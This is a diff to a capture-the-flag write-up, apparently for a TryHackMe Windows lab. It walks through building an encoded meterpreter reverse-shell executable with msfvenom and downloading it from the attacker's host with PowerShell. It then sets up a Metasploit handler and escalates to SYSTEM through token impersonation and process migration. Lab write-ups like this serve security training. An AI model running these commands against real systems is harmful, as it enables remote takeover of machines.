@@ -163,15 +163,117 @@ Question 3: What is the user.txt flag?
 
 # Switching Shells Questions
 
-Question 1: 
-
-What is the final size of the exe payload that you generated?
+Question 1: What is the final size of the exe payload that you generated?
 
 #
 
 # Question 1
 
+To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
 
+Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
 
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
+
+For my case: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.106.187 LPORT=1337 -f exe -o ExploitShell.exe`
+
+- LHOST = your own IP Address.
+- LPORT = can be any port that is unuse.
+- shell-name = any shell name.
+
+Open up a new terminal and run the msfvenom above.
+
+<p align="center"> <img src="https://i.imgur.com/uFhN1jS.png" height="90%" width="90%" alt=""/>
+
+After creating this payload, download it to the bruce's machine using the same method in the previous step:
+
+`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`
+
+For my case: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.106.187:80/ExploitShell.exe','ExploitShell.exe')"`
+
+On Bruce's Terminal run the command above.
+- We can see that it's on bruce's desktop with `ls` command.
+
+<p align="center"> <img src="https://i.imgur.com/neHJFSW.png" height="90%" width="90%" alt=""/>
+
+Before running the exploit, we have to ensure the handler is set up in Metasploit.
+
+- On Terminal open up Metasploit with: `msfconsole`.
+- After Metasploit is running type in: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp`.
+- Set LHOST to your IP address: `set LHOST 10.6.106.187`.
+- Set LPORT to the same port you used for payload: `set LPORT 1337`.
+- Run the exploit: `run`.
+
+<p align="center"> <img src="https://i.imgur.com/TgJI1jD.png" height="90%" width="90%" alt=""/>
+
+On bruce's desktop terminal, run the "ExploitShell.exe".
+
+<p align="center"> <img src="https://i.imgur.com/RyJLlzy.png" height="90%" width="90%" alt=""/>
+
+Successfully got in the meterpreter shell.
+
+<p align="center"> <img src="https://i.imgur.com/aDHXak4.png" height="90%" width="90%" alt=""/>
+
+Question 1: What is the final size of the exe payload that you generated?
+
+`73802`
+
+<p align="center"> <img src="https://i.imgur.com/otud9R0.png" height="90%" width="90%" alt=""/>
+
+#
+
+# Privilege Escaltion Question
+
+Question 1: What is the output when you run the getuid command?
+
+Question 2: Read the root.txt file located at C:\Windows\System32\config
+
+# Question 1
+
+We will view all the privileges using `whoami /priv` on powershell terminal.
+
+<p align="center"> <img src="https://i.imgur.com/K53OOsL.png" height="90%" width="90%" alt=""/>
+
+We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.
+
+Enter: `load incognito` to load the incognito module in Metasploit. 
+
+<p align="center"> <img src="https://i.imgur.com/Xdvl2ha.png" height="90%" width="90%" alt=""/>
+
+To check which tokens are available, enter: `list_tokens -g`.
+- We can see that the BUILTIN\Administrators token is available.
+
+<p align="center"> <img src="https://i.imgur.com/bCDbKGV.png" height="90%" width="90%" alt=""/>
+
+Use the `impersonate_token "BUILTIN\Administrators"` command to impersonate the Administrators' token.
+
+<p align="center"> <img src="https://i.imgur.com/9p8PtQ8.png" height="90%" width="90%" alt=""/>
+
+Question 1: What is the output when you run the `getuid` command?
+
+`NT AUTHORITY\SYSTEM`
+
+<p align="center"> <img src="https://i.imgur.com/oUPZu4h.png" height="90%" width="90%" alt=""/>
+
+#
+
+# Question 2
+
+Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
+
+The safest process to pick is the services.exe process.
+
+First, use the `ps` command to view processes and find the PID of the services.exe process. 
+
+<p align="center"> <img src="https://i.imgur.com/jH5HEAe.png" height="90%" width="90%" alt=""/>
+
+Migrate to this process using the command `migrate PID-OF-PROCESS`.
+- Successfully mirgated to PID 668.
+
+<p align="center"> <img src="https://i.imgur.com/kOPbDll.png" height="90%" width="90%" alt=""/>
+
+Type in shell > Navigate to C:\Windows\System32\config > read "root.txt".
+
+<p align="center"> <img src="https://i.imgur.com/4US07xK.png" height="90%" width="90%" alt=""/>
 
 
